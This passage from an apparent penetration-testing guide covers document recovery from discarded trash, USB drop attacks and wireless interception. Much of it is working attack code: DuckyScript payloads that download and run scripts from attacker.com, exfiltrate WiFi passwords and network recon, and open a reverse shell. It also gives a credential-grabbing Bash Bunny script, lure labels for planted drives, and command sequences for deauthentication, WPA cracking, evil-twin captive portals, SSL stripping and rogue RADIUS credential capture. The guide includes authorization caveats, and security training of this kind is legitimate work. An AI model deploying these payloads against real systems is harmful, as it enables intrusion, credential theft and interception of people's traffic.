- **Authorization required** - Professional penetration tests require explicit written permission for physical security testing
- **Safety hazards** - Biological waste, sharp objects, chemical residues, unstable structures

**Document Recovery Techniques:**

**1. Physical Document Reconstruction:**

```bash
# Shredded document reconstruction
# Tools needed:
- Large flat surface (table or floor space)
- Clear plastic sheets or document protectors
- Scanner or high-resolution camera
- Image editing software

# Process:
1. Sort shredded pieces by paper type, color, and weight
2. Organize by edge types (straight edges = document perimeter)
3. Match text fragments by font, size, and alignment
4. Reconstruct line by line, using context clues
5. Photograph or scan reconstructed sections
6. Use digital tools for final assembly if needed
```

**2. Digital Media Recovery:**

```bash
# Hard drive data recovery
# Connect recovered drive to forensic workstation

# Create bit-for-bit image
sudo dd if=/dev/sdX of=/path/to/image.dd bs=4M status=progress
# OR use dc3dd for verification
sudo dc3dd if=/dev/sdX of=/path/to/image.dd hash=md5 hash=sha256

# Analyze with forensic tools
# Autopsy (GUI for The Sleuth Kit)
autopsy

# PhotoRec for file carving
photorec /path/to/image.dd

# TestDisk for partition recovery
testdisk /path/to/image.dd

# Strings analysis for quick wins
strings image.dd | grep -i "password"
strings image.dd | grep -E "[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}"

# Foremost for file extraction
foremost -i image.dd -o /output/directory -t all
```

**3. USB Flash Drive Recovery:**

```bash
# Check if drive is recognized
lsblk
sudo fdisk -l

# If not mounting, attempt repair
sudo fsck /dev/sdX1

# Create image for analysis
sudo dd if=/dev/sdX of=usb_image.dd bs=4M

# Mount image
mkdir /mnt/usb_recovery
sudo mount -o loop,ro usb_image.dd /mnt/usb_recovery

# File carving if filesystem corrupted
scalpel usb_image.dd -o /output/dir
```

**4. Document Cache Extraction from Printers:**

[Inference - based on common printer architectures]: Many modern multifunction printers contain hard drives or solid-state storage that cache print jobs, scanned documents, and fax transmissions.

```bash
# Physical access to printer hard drive
# Remove HDD following manufacturer service manual
# Connect to forensic workstation

# Printer-specific forensic tools
# PRTK (Printer Forensics Toolkit) - commercial
# Manual analysis:

# Mount printer drive
sudo mount /dev/sdX1 /mnt/printer_forensics

# Search for common document formats
find /mnt/printer_forensics -type f -name "*.pdf"
find /mnt/printer_forensics -type f -name "*.tiff"
find /mnt/printer_forensics -type f -name "*.pcl"

# Extract print job files
# Locations vary by manufacturer:
# HP: /PJL/ or /temp/
# Xerox: /tmp/ or /var/spool/
# Canon: /hdd/spool/

# Analyze with strings
strings /dev/sdX | grep -a "Subject:\|From:\|To:\|Password"
```

**Operational Security for Dumpster Diving:**

```bash
# Equipment checklist:
- Disposable gloves (latex or nitrile)
- Flashlight or headlamp
- Large bags or containers for transport
- Hand sanitizer and wipes
- Camera for documenting findings in situ
- Lock picking tools (if authorized for locked dumpsters)
- Ladder or step stool for tall dumpsters

# Documentation:
- Photograph items before removal
- Log date, time, location of recovery
- Maintain chain of custody for evidence
- Note environmental conditions
```

**Information Synthesis from Recovered Materials:**

```python
# Python script to organize and analyze recovered data
import os
import re
from datetime import datetime

class DumpsterDiveAnalysis:
    def __init__(self):
        self.emails = []
        self.credentials = []
        self.phone_numbers = []
        self.ip_addresses = []
        
    def parse_documents(self, directory):
        """Parse recovered text documents for sensitive information"""
        
        for filename in os.listdir(directory):
            filepath = os.path.join(directory, filename)
            
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    
                    # Extract emails
                    emails = re.findall(r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}', content)
                    self.emails.extend(emails)
                    
                    # Extract potential credentials
                    passwords = re.findall(r'(?i)password[:\s]+([^\s]+)', content)
                    self.credentials.extend(passwords)
                    
                    # Extract phone numbers
                    phones = re.findall(r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b', content)
                    self.phone_numbers.extend(phones)
                    
                    # Extract IP addresses
                    ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', content)
                    self.ip_addresses.extend(ips)
                    
            except Exception as e:
                print(f"Error processing {filename}: {e}")
    
    def generate_report(self):
        """Generate analysis report"""
        report = f"""
Dumpster Diving Analysis Report
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

=== EMAIL ADDRESSES ({len(set(self.emails))}) ===
{chr(10).join(sorted(set(self.emails)))}

=== POTENTIAL CREDENTIALS ({len(self.credentials)}) ===
{chr(10).join(self.credentials[:20])}  # First 20 only

=== PHONE NUMBERS ({len(set(self.phone_numbers))}) ===
{chr(10).join(sorted(set(self.phone_numbers)))}

=== IP ADDRESSES ({len(set(self.ip_addresses))}) ===
{chr(10).join(sorted(set(self.ip_addresses)))}
"""
        return report

# Usage:
analyzer = DumpsterDiveAnalysis()
analyzer.parse_documents('/path/to/recovered/documents')
print(analyzer.generate_report())
```

### USB Drop Attacks

USB drop attacks exploit human curiosity and trust by deploying malicious USB devices in locations where targets are likely to find and connect them to corporate systems. This physical-to-digital attack vector bypasses many network security controls.

**USB Drop Attack Types:**

**1. Rubber Ducky / BadUSB Attacks:**

USB devices that emulate keyboards and execute pre-programmed keystroke sequences when connected.

**Hardware Options:**

- **USB Rubber Ducky** - Hak5 device with DuckyScript programming
- **Bash Bunny** - Multi-vector USB attack platform
- **Malduino** - Arduino-based BadUSB device
- **Digispark ATtiny85** - Low-cost programmable USB device
- **OMG Cable** - Malicious USB cable with embedded attack platform

**DuckyScript Payload Examples:**

```duckyscript
REM Windows Reverse Shell Payload
REM Opens PowerShell and downloads/executes payload

DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
ENTER
```

```duckyscript
REM Credential Harvester
REM Extracts saved WiFi passwords and exfiltrates

DELAY 1000
GUI r
DELAY 500
STRING cmd /k mode 65,3
ENTER
DELAY 500
STRING (netsh wlan show profiles) | Select-String ":(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize | Out-File $env:temp\wifi.txt
DELAY 2000
STRING powershell -WindowStyle Hidden -Command "$wc=New-Object System.Net.WebClient;$wc.UploadFile('http://attacker.com/upload.php', $env:temp\wifi.txt)"
ENTER
DELAY 1000
STRING del %temp%\wifi.txt & exit
ENTER
```

```duckyscript
REM Network Reconnaissance
REM Gathers network configuration and active connections

DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $info = @(); $info += "=== NETWORK CONFIG ==="; $info += ipconfig /all; $info += "`n=== ARP CACHE ==="; $info += arp -a; $info += "`n=== ROUTING TABLE ==="; $info += route print; $info += "`n=== NETSTAT ==="; $info += netstat -ano; $info | Out-File $env:temp\recon.txt; IWR -Uri http://attacker.com/upload.php -Method POST -InFile $env:temp\recon.txt; Remove-Item $env:temp\recon.txt
ENTER
```

**Linux-Targeted Payloads:**

```duckyscript
REM Linux Reverse Shell
DELAY 1000
CTRL ALT t
DELAY 500
STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
ENTER
DELAY 100
STRING exit
ENTER
```

**MacOS Payloads:**

```duckyscript
REM macOS Terminal Backdoor
DELAY 1000
COMMAND SPACE
DELAY 500
STRING terminal
ENTER
DELAY 1000
STRING curl -o /tmp/payload.sh http://attacker.com/mac_payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh &
ENTER
DELAY 500
STRING exit
ENTER
```

**Programming the USB Rubber Ducky:**

```bash
# Install required tools
git clone https://github.com/hak5darren/USB-Rubber-Ducky.git
cd USB-Rubber-Ducky

# Write DuckyScript payload (payload.txt)
# Encode to inject.bin
java -jar duckencoder.jar -i payload.txt -o inject.bin

# Copy inject.bin to USB Rubber Ducky root directory
# Device will execute on next insertion
```

**2. HID Spoofing with Bash Bunny:**

The Bash Bunny can emulate multiple USB device types and execute complex attack chains.

```bash
# Bash Bunny payload structure
# payloads/switch1/payload.txt

#!/bin/bash
# Title: Credential Grabber
# Author: Your Name
# Target: Windows 10/11

LED SETUP
ATTACKMODE HID STORAGE

# Wait for Windows to recognize devices
LED ATTACK
sleep 5

# Open Run dialog
RUN WIN powershell -WindowStyle Hidden

# Wait for PowerShell
sleep 2

# Execute credential extraction
QUACK STRING \$creds = Get-Credential; \$creds.GetNetworkCredential().Password | Out-File \$env:temp\\pass.txt; Copy-Item \$env:temp\\pass.txt \\\\USB_DRIVE_LETTER\\loot.txt
QUACK ENTER

# Cleanup and exit
sleep 3
QUACK STRING Remove-Item \$env:temp\\pass.txt; exit
QUACK ENTER

LED FINISH
sync
```

**3. Passive Data Exfiltration Devices:**

USB devices that silently copy data when connected without user interaction.

**USB Killer:** [Not recommended for ethical testing]: Devices that deliver high-voltage electrical discharge to destroy connected systems. These cause physical damage and are typically not authorized in penetration tests.

**Packet Squirrel:** Ethernet-based attack device disguised as USB adapter for network interception.

```bash
# Packet Squirrel payload example
# Transparent proxy configuration

#!/bin/bash

LED SETUP

# Configure network interfaces
NETMODE TRANSPARENT

# Start packet capture
LED ATTACK
tcpdump -i eth0 -w /loot/capture_$(date +%Y%m%d_%H%M%S).pcap &

# Enable SSL stripping
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sslstrip -l 10000 &

# Wait for collection period
sleep 3600

# Cleanup
LED FINISH
killall tcpdump
killall sslstrip
```

**USB Drop Attack Deployment Strategy:**

**Target Location Selection:**

High-value locations for USB drops:

- **Building entrances and lobbies** - High traffic, likely to be found quickly
- **Parking lots near executive spaces** - Suggests device belongs to high-level employee
- **Conference rooms** - Found during or after meetings
- **Cafeterias and break rooms** - Social engineering opportunity
- **Smoking areas** - Isolated locations where targets may have time to examine device
- **Mailrooms and loading docks** - Suggests vendor or delivery origin
- **IT department areas** - Staff may connect to investigate

**Social Engineering Enhancement:**

Label USB devices to increase connection likelihood:

```
Labels that work:
- "Executive Salary Information 2024"
- "Confidential - HR Review"
- "Q4 Budget - DRAFT"
- "Employee Layoff List - DO NOT SHARE"
- "Network Passwords Backup"
- "Building Security Footage"
- "CEO Personal Files"
- "Bonus Structure 2024"
```

Physical presentation:

- Use branded USB drives matching target organization
- Include business cards or documents suggesting legitimate ownership
- Place in sealed envelope marked "Confidential"
- Attach note: "Found in parking lot - please return to IT"

**Detection and Prevention Awareness:**

Modern endpoint protection may detect HID attacks:

```bash
# Windows Defender may flag:
- Rapid keystroke sequences
- Hidden PowerShell windows
- Unsigned scripts
- Download attempts from suspicious domains

# AppLocker / Device Control policies may block:
- USB storage devices
- HID devices not on whitelist
- Unsigned device drivers
```

[Inference]: Success rates vary based on endpoint security maturity. Organizations with USB device whitelisting, endpoint detection and response (EDR), and security awareness training will have lower success rates.

**Monitoring USB Drop Effectiveness:**

**Payload with Callback:**

```duckyscript
REM Beacon-enabled payload
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "IWR -Uri http://attacker.com/beacon?id=USB-001-Location-A -UseBasicParsing"
ENTER
```

**Server-side tracking:**

```python
# Simple Flask server to log callbacks
from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

@app.route('/beacon')
def beacon():
    device_id = request.args.get('id', 'unknown')
    ip = request.remote_addr
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    with open('usb_callbacks.log', 'a') as f:
        f.write(f"{timestamp} | {device_id} | {ip}\n")
    
    # Return 1x1 pixel image to avoid errors
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

**Legal and Ethical Considerations:**

USB drop attacks in professional penetration testing require:

- **Explicit authorization** in scope of work
- **Controlled deployment** with tracking of all devices
- **Retrieval plan** for all deployed devices
- **No destructive payloads** (USB Killers, data wipers)
- **Compliance with computer fraud laws** (CFAA in US, Computer Misuse Act in UK)

[Unverified - jurisdiction dependent]: Deploying malicious USB devices without authorization may violate computer fraud and unauthorized access laws in most jurisdictions.

### Wireless Network Interception

Wireless network interception involves capturing, analyzing, and potentially manipulating wireless communications, primarily targeting WiFi (802.11) networks but also including Bluetooth, cellular, and other RF protocols.

**Wireless Reconnaissance Fundamentals:**

**1. Identifying Wireless Networks:**

```bash
# Enable monitor mode on wireless interface
# Check current interface name
iwconfig
# OR
ip link show

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0
# Creates monitor interface (wlan0mon or similar)

# Verify monitor mode
iwconfig wlan0mon
```

**Network Discovery:**

```bash
# Airodump-ng for comprehensive scanning
sudo airodump-ng wlan0mon

# Output explanation:
# BSSID: MAC address of access point
# PWR: Signal strength (closer to 0 = stronger)
# Beacons: Frames broadcast by AP
# CH: Operating channel
# ENC: Encryption type (WPA2, WPA3, WEP, OPN)
# ESSID: Network name

# Target specific channel for detailed capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Scan specific frequency band
sudo airodump-ng --band a wlan0mon  # 5GHz only
sudo airodump-ng --band bg wlan0mon # 2.4GHz only
```

**Alternative scanning tools:**

```bash
# Kismet - powerful wireless detector and sniffer
sudo kismet -c wlan0mon

# Wash - detect WPS-enabled networks
sudo wash -i wlan0mon

# LinSSID - graphical WiFi scanner (GUI)
sudo linssid

# Wavemon - ncurses-based signal monitor
wavemon
```

**2. Network Mapping and Analysis:**

```bash
# Detailed AP reconnaissance
sudo airodump-ng --wps --manufacturer -w survey wlan0mon

# Export to formats for analysis
# CSV, Kismet XML, GPSd for geolocation

# WiFite - automated attack tool with recon
sudo wifite --kill

# Identify clients and their associated APs
# Look at "Station" column in airodump-ng
```

**Analyzing network security:**

```bash
# Check for WPS vulnerabilities
sudo wash -i wlan0mon -s

# Identify encryption weaknesses
# WEP: Critically weak, crack in minutes
# WPA/WPA2 PSK: Vulnerable to handshake capture + offline cracking
# WPA2 Enterprise: Vulnerable to RADIUS attacks, certificate validation issues
# WPA3: Resistant to offline dictionary attacks, but implementation bugs exist

# Check for open networks
sudo airodump-ng wlan0mon | grep OPN
```

**WPA/WPA2 Handshake Capture:**

The four-way handshake occurs when clients authenticate to WPA/WPA2 networks. Capturing this handshake enables offline password cracking.

**Passive Capture Method:**

```bash
# Start capture on target network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Wait for client to connect/reconnect naturally
# Handshake captured when airodump-ng displays "WPA handshake: AA:BB:CC:DD:EE:FF"

# Verify handshake capture
aircrack-ng handshake-01.cap
# Should show "1 handshake" if successful
```

**Active Deauthentication Method:**

```bash
# Deauthenticate client to force reauthentication
# This captures the handshake immediately

# Deauth specific client
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# Broadcast deauth to all clients on AP
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Parameters:
# --deauth 10: Send 10 deauth packets
# -a: AP BSSID (access point MAC)
# -c: Client MAC (specific target)

# Monitor capture window - handshake should appear within seconds
```

**Handshake Validation:**

```bash
# Verify handshake integrity
aircrack-ng -w /path/to/wordlist.txt handshake-01.cap

# Alternative verification with tshark
tshark -r handshake-01.cap -Y "eapol" | head -20

# Convert to hashcat format for GPU cracking
hcxpcaptool -z handshake.hc22000 handshake-01.cap
# OR newer tool
hcxpcapngtool -o handshake.hc22000 handshake-01.cap
```

**WPA/WPA2 Password Cracking:**

**Dictionary Attack:**

```bash
# Aircrack-ng with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap

# Hashcat for GPU acceleration (much faster)
hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt

# Hashcat with rules for mutations
hashcat -m 22000 handshake.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt --format=wpapsk handshake-01.cap
```

**Custom Wordlist Generation:**

```bash
# Crunch - generate custom wordlists
crunch 8 12 -t @@@@@@@@ -o wordlist.txt
# 8-12 character passwords with lowercase letters

# Generate based on target info
crunch 8 12 -t Company@@@ -o custom.txt
# Creates: Company123, Company456, etc.

# Cewl - spider website to create wordlist
cewl -d 2 -m 6 https://target-company.com -w company_wordlist.txt

# Cupp - Common User Password Profiler
python3 cupp.py -i
# Interactive questions to generate personalized wordlist
```

**Mask Attack:**

```bash
# Hashcat mask attack for pattern-based cracking
# ?d = digit, ?l = lowercase, ?u = uppercase, ?s = special

# Pattern: 8 lowercase + 2 digits
hashcat -m 22000 handshake.hc22000 -a 3 ?l?l?l?l?l?l?l?l?d?d

# Pattern: Capital letter + 6 lower + 2 digits + special
hashcat -m 22000 handshake.hc22000 -a 3 ?u?l?l?l?l?l?l?d?d?s

# Hybrid attack: wordlist + mask
hashcat -m 22000 handshake.hc22000 -a 6 wordlist.txt ?d?d?d?d
# Appends 4 digits to each word
```

**WPS Attacks:**

WiFi Protected Setup (WPS) vulnerabilities allow PIN brute-forcing to recover WPA/WPA2 passwords.

```bash
# Identify WPS-enabled networks
sudo wash -i wlan0mon

# Reaver - WPS brute force attack
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Common options:
# -c 6: Specify channel
# -d 2: Delay 2 seconds between attempts (avoid detection)
# -T 0.5: Timeout period
# -N: Don't send NACK messages
# -vv: Verbose output

# Bully - alternative WPS attack tool
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon

# Pixie Dust attack (offline WPS PIN attack)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -K
```

[Unverified - depends on AP implementation]: WPS attacks succeed primarily on older routers. Many modern routers implement rate limiting, lockout periods, or disable WPS PIN after failed attempts.

**Evil Twin / Rogue Access Point Attacks:**

Creating a fake access point to intercept traffic or capture credentials.

**Basic Evil Twin Setup:**

```bash
# Create rogue AP with hostapd
# Configure hostapd.conf

cat > hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=CompanyWiFi
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

# Start hostapd
sudo hostapd hostapd.conf

# Configure DHCP server for clients
sudo dnsmasq -C dnsmasq.conf -d

# dnsmasq.conf example:
# interface=wlan0
# dhcp-range=192.168.1.10,192.168.1.100,8h
# dhcp-option=3,192.168.1.1
# dhcp-option=6,192.168.1.1
```

**Automated Evil Twin with WiFi-Pumpkin:**

```bash
# Install WiFi-Pumpkin 3
sudo apt install wifi-pumpkin3
# OR
pip3 install wifipumpkin3

# Launch
sudo wifipumpkin3

# Within wp3 interface:
set interface wlan0
set ssid CompanyWiFi
proxies   # Enable MITM proxies
captiveflask # Enable captive portal for credential harvesting
start
```

**Captive Portal Credential Harvesting:**

```bash
# Fluxion - automated evil twin with captive portal
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
sudo ./fluxion.sh

# Fluxion workflow:
# 1. Scans for networks
# 2. Captures handshake
# 3. Creates evil twin
# 4. Deauths clients from real AP
# 5. Clients connect to evil twin
# 6. Captive portal requests "verification" password
# 7. Tests captured password against handshake
# 8. Successful password displayed
```

**Traffic Interception and Analysis:**

Once clients connect to evil twin:

```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Configure NAT for internet access
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT

# Capture all traffic
sudo tcpdump -i wlan0 -w evil_twin_capture.pcap

# SSL stripping for HTTPS downgrade
sslstrip -l 10000 -w sslstrip.log &
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
```

**WPA3 Attacks:**

WPA3 uses Simultaneous Authentication of Equals (SAE) instead of PSK, making traditional handshake attacks ineffective.

**Dragonblood Attacks:**

[Unverified - requires specific vulnerable implementations]: CVE-2019-9494, CVE-2019-9495 and related vulnerabilities in early WPA3 implementations.

```bash
# Dragonslayer toolkit
git clone https://github.com/vanhoefm/dragonslayer.git
cd dragonslayer

# Test for timing-based side channel (CVE-2019-9494)
./dragonslayer.py --target AA:BB:CC:DD:EE:FF --interface wlan0mon

# Cache-based side channel attack
./dragonslayer.py --cache-attack --target AA:BB:CC:DD:EE:FF --interface wlan0mon
```

Most modern WPA3 implementations patch these vulnerabilities. Successful attacks require:

- Outdated firmware/software
- Specific chipset vulnerabilities
- Physical proximity for timing measurements

**Enterprise WiFi Attacks (802.1X/EAP):**

WPA2/WPA3 Enterprise uses RADIUS authentication with various EAP methods.

**EAP Method Identification:**

```bash
# Capture EAP handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w enterprise wlan0mon

# Analyze with tshark
tshark -r enterprise-01.cap -Y "eapol" -V | grep "Type:"

# Common EAP types:
# EAP-TLS: Certificate-based (strong)
# EAP-TTLS: Tunneled TLS (username/password)
# PEAP: Protected EAP (username/password)
# EAP-MD5: Legacy
# EAP-GTC: Generic Token Card
````

**Rogue RADIUS Server Attacks:**

```bash
# Hostapd-wpe (Wireless Pwnage Edition)
# Creates rogue AP that captures EAP credentials

# Install
sudo apt install hostapd-wpe

# Configure hostapd-wpe.conf
cat > hostapd-wpe.conf << EOF
interface=wlan0
driver=nl80211
ssid=CompanyWiFi-Enterprise
channel=6
hw_mode=g

# WPA2 Enterprise settings
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP

# RADIUS server (self)
ieee8021x=1
eap_server=1
eap_user_file=hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
dh_file=/etc/hostapd-wpe/certs/dh
EOF

# Start rogue AP
sudo hostapd-wpe hostapd-wpe.conf

# Captured credentials appear in:
# /var/log/hostapd-wpe.log
# Format: username, challenge, response (can be cracked offline)
````

**Deauthenticating enterprise clients:**

```bash
# Force clients to disconnect from legitimate AP
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Clients may automatically connect to rogue AP
# if SSID matches and certificate validation is weak
```

**Cracking captured EAP hashes:**

```bash
# EAP-TTLS/PEAP MSCHAPv2 challenge/response
# Extract from hostapd-wpe.log

# Format for hashcat/john
# username:::challenge:response

# Hashcat mode 5500 (NetNTLMv1) or 5600 (NetNTLMv2)
hashcat -m 5600 eap_hashes.txt /usr/share/wordlists/rockyou.txt

# Asleap for LEAP/EAP-MD5
asleap -C challenge -R response -W wordlist.txt
```

**Certificate Validation Attacks:**

[Inference]: Many enterprise WiFi clients fail to properly validate RADIUS server certificates, accepting any certificate or only checking CN (Common Name) without validating the certificate chain.

```bash
# Test certificate validation
# Create rogue AP with self-signed certificate
# If clients connect without warning, validation is weak

# Generate fake certificate matching legitimate CN
openssl req -new -x509 -days 365 -nodes \
  -out fake_server.pem -keyout fake_server.key \
  -subj "/CN=radius.company.com"

# Use in hostapd-wpe.conf
# Clients with weak validation will accept
```

**Bluetooth Interception:**

Bluetooth operates in 2.4GHz frequency range with different protocols and security models.

**Bluetooth Discovery:**

```bash
# Enable bluetooth adapter
sudo hciconfig hci0 up

# Scan for devices
sudo hcitool scan

# Detailed scanning with names
sudo hcitool scan --all --flush

# Bluetooth Low Energy (BLE) scan
sudo hcitool lescan

# Detailed device information
sudo hciconfig -a hci0
```

**Bluez tools for reconnaissance:**

```bash
# Sdptool - Service Discovery Protocol browsing
sudo sdptool browse MAC_ADDRESS

# L2ping - connectivity test
sudo l2ping MAC_ADDRESS

# Btmon - Bluetooth traffic monitor
sudo btmon
```

**Ubertooth for advanced Bluetooth attacks:**

```bash
# Ubertooth One - hardware sniffer for Bluetooth

# Spectrum analysis
ubertooth-specan-ui

# Follow specific connection
ubertooth-follow -t MAC_ADDRESS

# Sniff BLE advertisements
ubertooth-btle -f -c capture.pcap

# Analyze with Wireshark
wireshark capture.pcap
```

**BlueBorne Attacks:**

[Unverified - requires vulnerable Bluetooth implementations]: CVE-2017-0781, CVE-2017-0782, CVE-2017-0785 - Bluetooth vulnerabilities enabling remote code execution without pairing.

```bash
# BlueBorne scanner
git clone https://github.com/ArmisSecurity/blueborne.git
cd blueborne/android
python blueborne-detector.py

# Exploitation tools (if authorized)
# Use Metasploit modules for specific CVEs
msfconsole
use auxiliary/scanner/bluetooth/blueborne_scanner
set RHOSTS target_device_mac
run
```

**Bluetooth PIN Cracking:**

```bash
# Legacy Bluetooth pairing (PIN-based)
# Requires physical proximity during pairing

# Btcrack - Bluetooth PIN cracker
git clone https://github.com/mikeryan/btcrack.git
cd btcrack
./btcrack -f capture.dump

# Crackle - BLE Long Term Key cracking
git clone https://github.com/mikeryan/crackle.git
cd crackle
make
./crackle -i capture.pcap

# Requirements:
# - Capture of pairing process
# - Legacy pairing (not Secure Simple Pairing)
```

**Bluetooth Spoofing:**

```bash
# Change adapter MAC address
sudo hciconfig hci0 down
sudo hciconfig hci0 address AA:BB:CC:DD:EE:FF
sudo hciconfig hci0 up

# Spoof device name
sudo hciconfig hci0 name "Trusted Device"

# Spoof device class (appears as specific device type)
sudo hciconfig hci0 class 0x1F00
```

**Cellular Network Interception:**

[Legal Warning]: Cellular interception equipment (IMSI catchers, Stingrays) is heavily regulated and typically illegal to operate without specific government authorization in most jurisdictions.

**GSM/LTE Basics:**

```
GSM (2G): Weak A5/1 encryption, vulnerable to interception
3G: Better encryption, still vulnerable to downgrade attacks
4G/LTE: Strong encryption, but authentication issues
5G: Improved security, but implementation flaws exist
```

**IMSI Catcher Detection:**

```bash
# Detect fake base stations
# Android IMSI-Catcher Detector (AIMSICD)
# Install from GitHub or F-Droid

# Checks for:
# - Cell tower location changes
# - Unusual signal strength
# - Missing encryption
# - Silent SMS
# - Cell tower ID inconsistencies

# SnoopSnitch (Android)
# Analyzes mobile radio traffic
# Requires rooted device with Qualcomm chipset
```

**SDR (Software Defined Radio) for RF Analysis:**

```bash
# RTL-SDR for receiving/analyzing wireless signals

# Install tools
sudo apt install rtl-sdr gqrx-sdr

# Test RTL-SDR device
rtl_test

# GQRX for spectrum analysis
gqrx

# Scan GSM frequencies
# GSM-900: 890-915 MHz (uplink), 935-960 MHz (downlink)
# GSM-1800: 1710-1785 MHz (uplink), 1805-1880 MHz (downlink)
```

**GNURadio for Protocol Analysis:**

```bash
# Install GNURadio
sudo apt install gnuradio

# GSM analysis with gr-gsm
git clone https://github.com/ptrkrysik/gr-gsm.git
cd gr-gsm
mkdir build
cd build
cmake ..
make
sudo make install

# Capture GSM traffic
grgsm_scanner

# Decode SMS (if encryption weak/missing)
grgsm_decode -c capture.cfile
```

[Unverified - jurisdiction dependent, high legal risk]: Operating cellular interception equipment without authorization violates telecommunications laws in most countries. Penalties include significant fines and imprisonment.

**WiFi Geolocation and Wardriving:**

**Kismet with GPS:**

```bash
# Connect GPS receiver (USB or Bluetooth)
# Verify GPS device
cgps

# Start Kismet with GPS
sudo kismet -c wlan0mon --override wardrive

# Kismet logs include GPS coordinates for discovered networks
# Output: .kismet database file

# Export to formats
kismetdb_to_kml --in kismet.kismet --out networks.kml
kismetdb_to_gpx --in kismet.kismet --out networks.gpx

# View in Google Earth or QGIS
```

**Wigle WiFi Wardriving (Mobile):**

Mobile app for network discovery with GPS logging. Can export data for analysis.

**Creating WiFi Heatmaps:**

```python
# Python script to generate WiFi coverage heatmap
import folium
from folium.plugins import HeatMap
import sqlite3

def generate_heatmap(kismet_db, output_html):
    """Generate heatmap from Kismet database"""
    
    conn = sqlite3.connect(kismet_db)
    cursor = conn.cursor()
    
    # Extract GPS coordinates and signal strength
    query = """
    SELECT lat, lon, signal 
    FROM datasources 
    WHERE lat != 0 AND lon != 0
    """
    
    cursor.execute(query)
    data = cursor.fetchall()
    
    # Create map centered on average position
    if data:
        avg_lat = sum(d[0] for d in data) / len(data)
        avg_lon = sum(d[1] for d in data) / len(data)
        
        m = folium.Map(location=[avg_lat, avg_lon], zoom_start=13)
        
        # Prepare heatmap data (lat, lon, weight)
        heat_data = [[d[0], d[1], abs(d[2])] for d in data]
        
        HeatMap(heat_data).add_to(m)
        
        m.save(output_html)
        print(f"[+] Heatmap saved to {output_html}")
    
    conn.close()

# Usage
generate_heatmap('kismet.kismet', 'wifi_heatmap.html')
```

**Traffic Analysis and Decryption:**

**WPA/WPA2 Decryption with Known Password:**

```bash
# Decrypt captured traffic if password is known
# Edit Wireshark preferences
# Edit > Preferences > Protocols > IEEE 802.11

# Add decryption key:
# wpa-pwd:password:SSID

# Or via command line with tshark
tshark -r encrypted_capture.pcap \
  -o "wlan.enable_decryption:TRUE" \
  -o "wlan.wep_key1:wpa-pwd:password:CompanyWiFi"

# Alternatively use airdecap-ng
airdecap-ng -e CompanyWiFi -p password encrypted_capture.pcap

# Output: decrypted-01.cap (ready for analysis)
```

**Analyzing Decrypted Traffic:**

```bash
# Extract HTTP credentials
tshark -r decrypted.cap -Y "http.request.method == POST" \
  -T fields -e http.request.uri -e http.file_data

# Extract images
foremost -i decrypted.cap -o extracted_files/

# Network Miner for automated analysis
# GUI tool that extracts files, credentials, sessions
networkminer decrypted.cap

# Driftnet - display images from traffic
driftnet -i wlan0mon

# URLSnarf - extract URLs
urlsnarf -i decrypted.cap
```

**HTTPS/TLS Analysis:**

```bash
# Even with WiFi decryption, TLS remains encrypted
# Analyze TLS handshakes for information leakage

# Extract Server Name Indication (SNI)
tshark -r capture.pcap -Y "tls.handshake.extensions_server_name" \
  -T fields -e tls.handshake.extensions_server_name | sort -u

# TLS version identification
